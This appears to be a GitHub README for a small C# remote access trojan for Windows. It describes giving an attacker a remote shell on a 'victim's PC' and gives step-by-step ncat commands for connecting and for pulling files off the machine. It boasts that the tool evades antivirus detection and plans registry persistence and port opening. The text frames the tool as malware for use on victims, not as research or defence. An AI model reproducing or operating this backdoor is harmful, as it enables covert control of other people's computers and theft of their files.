# SimpleRAT

Small RAT/Backdoor written fully in C#.
After installation and launch, listens on port specified in JSON configuration. After successfull connection gives remote shell.
Developed for Windows.

# What RAT can
1. After connection on specified port (provided in JSON file, which can be changed as you wish), gives reverse shell.
2. Is able to download any files from victim's PC on specified port (provided in JSON file), no need for server setup or anything, only netcat on your side and launched RAT on victim's side :)
#### How to download files:
1. Put netcat on listening state (ncat -v -l -p "port for file download from JSON" > "file name with extension that you want to download")
Example: ncat -v -l -p 8889 > helloworld2.exe
NOTE: I advice you to use "-v" for more verbose output
2. Connect to victim PC through netcat (ncat <ip addrress> <port from JSON configuration on which RAT will be listening>)
Example: ncat 192.168.88.220 8888
3. Check if reverse shell is working (cd, dir)
4. Currently RAT has it's own command interpreter which will listen to commands from your PC, these type of commands begin with "RAT".

For file download command is - "RAT download file -p <windows/path/to/file/withextension>"
  
Process:
![RAT-guide](https://user-images.githubusercontent.com/53906830/109512165-1aee9280-7aa4-11eb-891f-89ff993b7dd4.png)


Currently is FUD as it is small and simple, without any specific features.

TODO/Plans: 

1. File upload to victim's PC;
2. Merge JSON configuration into exe file, not to download anything additionally;
3. Create key in registry for self startup;
4. Open ports required for communications (for main connection, for file download, etc).
